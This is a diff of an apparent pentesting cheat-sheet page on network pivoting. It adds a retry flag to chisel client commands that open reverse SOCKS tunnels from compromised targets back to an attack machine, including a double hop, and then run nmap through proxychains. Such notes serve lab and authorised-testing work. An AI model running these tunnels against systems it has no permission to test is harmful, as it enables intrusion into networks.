@@ -261,12 +261,12 @@ netstat <span class="nt">-bant</span> | findstr 1080
 chisel server <span class="nt">-p</span> &lt;attack_machine_port&gt; <span class="nt">--socks5</span> <span class="nt">--reverse</span>
 
 <span class="c"># On the target, run:</span>
-chisel client &lt;attack_machine_IP&gt;:&lt;attack_machine_port&gt; R:&lt;proxychains_port&gt;:socks
+chisel client <span class="nt">--max-retry-count</span> 5 &lt;attack_machine_IP&gt;:&lt;attack_machine_port&gt; R:&lt;proxychains_port&gt;:socks
 
 <span class="c"># If /etc/proxychains4.conf is configured</span>
 <span class="c"># with "socks5  127.0.0.1 1080", you don't</span>
 <span class="c"># need to specify the default port:</span>
-chisel client &lt;attack_machine_IP&gt;:&lt;attack_machine_port&gt; R:socks
+chisel client <span class="nt">--max-retry-count</span> 5 &lt;attack_machine_IP&gt;:&lt;attack_machine_port&gt; R:socks
 
 <span class="c"># Then prepend any command with proxychains</span>
 proxychains nmap &lt;...&gt;
@@ -283,13 +283,13 @@ socks5  127.0.0.1 9999
 chisel server <span class="nt">-v</span> <span class="nt">-p</span> 9050 <span class="nt">--socks5</span> <span class="nt">--reverse</span>
 
 <span class="c"># On first target, run the first client:</span>
-./chisel client 10.10.16.14:9050 R:socks
+./chisel client <span class="nt">--max-retry-count</span> 5 10.10.16.14:9050 R:socks
 
 <span class="c"># Still on first target, run the second server for second target:</span>
 ./chisel server <span class="nt">-v</span> <span class="nt">-p</span> 9002 <span class="nt">--socks5</span> <span class="nt">--reversse</span>
 
 <span class="c"># On second target, run second client:</span>
-.<span class="se">\c</span>hisel.exe client &lt;first target IP&gt;:9002 R:9999:socks
+.<span class="se">\c</span>hisel.exe client <span class="nt">--max-retry-count</span> 5 &lt;first target IP&gt;:9002 R:9999:socks
 
 <span class="c"># On attack box, check that double hop is working:</span>
 proxychains nmap <span class="nt">-sT</span> <span class="nt">-p</span> 22 &lt;reachable IP through second target only&gt;
@@ -306,7 +306,7 @@ proxychains nmap <span class="nt">-sT</span> <span class="nt">-p</span> 22 &lt;r
 chisel server <span class="nt">-p</span> 1234 <span class="nt">--socks5</span>
 
 <span class="c"># On your attack machine, run:</span>
-chisel client &lt;target IP&gt;:1234 &lt;proxychains_port&gt;:socks
+chisel client <span class="nt">--max-retry-count</span> 5 &lt;target IP&gt;:1234 &lt;proxychains_port&gt;:socks
 </code></pre></div>
 
 <h2>References</h2>
